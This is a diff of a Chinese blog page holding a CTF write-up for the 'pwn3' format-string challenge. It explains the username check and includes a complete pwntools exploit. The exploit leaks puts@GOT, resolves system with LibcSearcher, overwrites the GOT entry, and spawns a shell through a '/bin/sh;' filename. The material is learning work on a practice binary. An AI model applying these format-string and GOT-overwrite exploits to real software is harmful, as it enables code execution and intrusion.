@@ -23,15 +23,15 @@
 <meta property="og:site_name" content="M4gne51um&#39;s blog">
 <meta property="og:description" content="fmtstr&#x2F;hijack got&#x2F;32位程序&#x2F;wiki题">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/1.png">
-<meta property="og:image" content="http://example.com/2.png">
-<meta property="og:image" content="http://example.com/4.png">
-<meta property="og:image" content="http://example.com/5.png">
+<meta property="og:image" content="http://example.com/2021/07/26/CCTF-pwn3/1.png">
+<meta property="og:image" content="http://example.com/2021/07/26/CCTF-pwn3/2.png">
+<meta property="og:image" content="http://example.com/2021/07/26/CCTF-pwn3/4.png">
+<meta property="og:image" content="http://example.com/2021/07/26/CCTF-pwn3/5.png">
 <meta property="article:published_time" content="2021-07-26T08:35:43.000Z">
 <meta property="article:modified_time" content="2021-08-09T09:24:30.500Z">
 <meta property="article:author" content="Magnesium">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/1.png">
+<meta name="twitter:image" content="http://example.com/2021/07/26/CCTF-pwn3/1.png">
   
   
   
@@ -281,12 +281,12 @@
               <div class="markdown-body">
                 
                 <p>先checksec</p>
-<p><img src="/1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/07/26/CCTF-pwn3/1.png" srcset="/img/loading.gif" lazyload></p>
 <p>看ida的第一步，首先应该输入正确的usrname，这里需要对输入的每一个字母的ascii码都加一，然后与sysbdmin进行strcmp，因此，我们输入的字符串应该是rxraclhm。</p>
-<p><img src="/2.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/07/26/CCTF-pwn3/2.png" srcset="/img/loading.gif" lazyload></p>
 <p>这里dest就被存入了sysbdmin的内容。</p>
 <p>接下来是输入命令，这份博客把各函数内容说得很详细了<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuren123/p/12748559.html%EF%BC%8C%E6%88%91%E4%BB%AC%E9%9B%86%E4%B8%AD%E5%85%B3%E6%B3%A8get_file%E5%87%BD%E6%95%B0%E4%B8%AD%E7%9A%84fmtstr%E6%BC%8F%E6%B4%9E">https://www.cnblogs.com/yuren123/p/12748559.html，我们集中关注get_file函数中的fmtstr漏洞</a></p>
-<p><img src="/4.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/07/26/CCTF-pwn3/4.png" srcset="/img/loading.gif" lazyload></p>
 <p>通过对其他函数的分析，程序通过指针实现存储文件的功能，每个文件的文件头大小为40，文件内容大小为200，在get_file函数中，输入需要打印的文件的文件名，将文件内容复制至dest指针指向的空间并直接printf，基本思路是将payload通过put_file输入其中一个文件中，然后使用get_file函数利用fmtstr进行利用。</p>
 <p>exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>p=process(<span class="hljs-string">&#x27;./pwn3&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pwn3&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br><br>//通过第一道认证<br>p.recvuntil(<span class="hljs-string">&#x27;nism):&#x27;</span>)<br>p.sendline(<span class="hljs-string">&quot;rxraclhm&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;ftp&gt;&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">input_file</span>(<span class="hljs-params">name,content</span>):<br>    p.sendline(<span class="hljs-string">&quot;put&quot;</span>)<br>    p.recv()<br>    p.sendline(name)<br>    p.recv()<br>    p.sendline(content)<br>    p.recv()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">output_file</span>(<span class="hljs-params">name</span>):<br>    p.sendline(<span class="hljs-string">&#x27;get&#x27;</span>)<br>    p.recv()<br>    p.sendline(name)<br><br>//泄露puts_got里的内容，及puts函数在该程序中的真正地址<br>input_file(<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">b&#x27;%8$s&#x27;</span>+p32(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>output_file(<span class="hljs-string">&#x27;1&#x27;</span>)<br><br>//recv的内容前<span class="hljs-number">4</span>个小端序字符为puts函数地址，后面的字符均为格式化字符串中%s后面的内容<br>puts_addr=u32(p.recv()[:<span class="hljs-number">4</span>])<br>log.success(<span class="hljs-string">&#x27;puts got:&#x27;</span>+<span class="hljs-built_in">hex</span>(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br><br>//使用libcSearcher找到system函数的真正地址<br>libc=LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span> ,puts_addr)<br>system_offset=libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>system_addr=puts_addr-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)+system_offset<br><br>//自动生成payload，这里的格式化字符串属于printf函数的第<span class="hljs-number">7</span>个参数<br>payload=fmtstr_payload(<span class="hljs-number">7</span>, &#123;elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]: system_addr&#125;)<br>input_file(<span class="hljs-string">&#x27;1&#x27;</span>,payload)<br>output_file(<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recv()<br>log.success(<span class="hljs-string">&#x27;sys_addr:&#x27;</span>+<span class="hljs-built_in">hex</span>(system_addr))<br><br>//输入一个文件名为/<span class="hljs-built_in">bin</span>/sh;的文件，当show_dir时会运行puts(/<span class="hljs-built_in">bin</span>/sh;)，即system(/<span class="hljs-built_in">bin</span>/sh;)<br>input_file(<span class="hljs-string">&#x27;/bin/sh;&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;dir&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
@@ -295,7 +295,7 @@
 <p>1、字符串偏移计算</p>
 <figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">input<span class="hljs-constructor">_file(&#x27;1&#x27;,&#x27;AAAA%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>%<span class="hljs-params">p</span>&#x27;)</span><br>output<span class="hljs-constructor">_file(&#x27;1&#x27;)</span><br>print(p.recv<span class="hljs-literal">()</span>)<br></code></pre></td></tr></table></figure>
 
-<p><img src="/5.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2021/07/26/CCTF-pwn3/5.png" srcset="/img/loading.gif" lazyload></p>
 <p>即第七个。</p>
 <p>2、libcsearcher的使用，不知道什么原因无法直接使用，提示no moudle named ‘libcsearcher’，上网搜到的方法没能解决，将程序与py文件复制到&#x2F;libcsearcher下后可正常使用。</p>
 <p>3、关于got表，在看了一些书和资料后大概明白，在程序地址随机化时，函数的got地址指向的空间内存着函数在该程序中真正的地址，因此</p>
